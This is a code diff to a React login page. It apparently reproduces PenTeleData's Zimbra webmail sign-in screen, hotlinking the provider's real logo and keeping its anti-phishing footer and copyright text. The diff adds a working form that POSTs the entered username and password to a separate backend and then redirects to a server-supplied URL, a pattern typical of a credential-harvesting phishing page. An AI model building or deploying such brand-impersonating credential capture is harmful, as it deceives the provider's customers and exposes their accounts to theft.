@@ -6,59 +6,69 @@ const LoginPage = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [rememberMe, setRememberMe] = useState(false);
+  const [loginStatus, setLoginStatus] = useState('');
 
   const togglePasswordVisibility = () => {
     setShowPassword(!showPassword);
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
-    console.log({ username, password, rememberMe });
+    setLoginStatus('');
+
+    try {
+      const response = await fetch('http://localhost:3000/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password }),
+      });
+
+      const result = await response.json();
+      if (result.success && result.redirectUrl) {
+        setLoginStatus('Login successful! Redirecting...');
+        setTimeout(() => window.location.href = result.redirectUrl, 2000); // Redirect after 2 seconds
+      } else {
+        setLoginStatus(result.message || 'Invalid credentials');
+      }
+    } catch (error) {
+      setLoginStatus('Error: Unable to connect to the server');
+      console.error('Login error:', error);
+    }
   };
 
   return (
     <div className="login-container">
-      {/* Mountain Background */}
       <div className="mountain-background"></div>
-
-      {/* Login Box */}
       <div className="login-box">
-        {/* Logo */}
         <div className="logo-container">
-          <div className="logo-icon"></div>
-          <span className="logo-text">PenTeleData</span>
+          <img
+            src="https://promail2.ptd.net/modern/clients/promail2.ptd.net/assets/logo.svg"
+            alt="PenTeleData Logo"
+            className="logo-image"
+          />
         </div>
-
-        {/* Title */}
         <h2 className="login-title">Log In</h2>
-
-        {/* Login Form */}
-        <div>
-          {/* Username Field */}
+        <form onSubmit={handleSubmit}>
           <div className="form-group">
-            <label className="form-label" htmlFor="username">
-              Username
-            </label>
+            <label className="form-label" htmlFor="username">Username</label>
             <input
               type="text"
               id="username"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               className="form-input"
+              required
             />
           </div>
-
-          {/* Password Field */}
           <div className="form-group password-container">
-            <label className="form-label" htmlFor="password">
-              Password
-            </label>
+            <label className="form-label" htmlFor="password">Password</label>
             <input
               type={showPassword ? 'text' : 'password'}
               id="password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
               className="form-input password-input"
+              required
             />
             <button
               type="button"
@@ -68,16 +78,8 @@ const LoginPage = () => {
               Show
             </button>
           </div>
-
-          {/* Bottom Row with Login Button and Remember Me */}
           <div className="form-bottom">
-            <button
-              type="button"
-              onClick={handleSubmit}
-              className="login-btn"
-            >
-              Log In
-            </button>
+            <button type="submit" className="login-btn">Log In</button>
             <label className="remember-me">
               <input
                 type="checkbox"
@@ -88,17 +90,20 @@ const LoginPage = () => {
               Remember me
             </label>
           </div>
-        </div>
+          {loginStatus && (
+            <div
+              className="text-center mt-4"
+              style={{ color: loginStatus.includes('successful') ? 'green' : 'red' }}
+            >
+              {loginStatus}
+            </div>
+          )}
+        </form>
       </div>
-
-      {/* Footer Warning */}
       <div className="footer-warning">
         <p>
           PenTeleData is aware that many of our customers have received phishing emails that appear to come from us. Please remember that we will NEVER ask you for personal information to validate your account via a link in an email. If you receive an email like this, please delete it or click the spam option to move it to your junk folder. For more information about phishing, visit{' '}
-          <a href="https://www.ptd.net/phishing" className="footer-link">
-            https://www.ptd.net/phishing
-          </a>
-          .
+          <a href="https://www.ptd.net/phishing" className="footer-link">https://www.ptd.net/phishing</a>.
         </p>
         <p className="copyright">
           Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
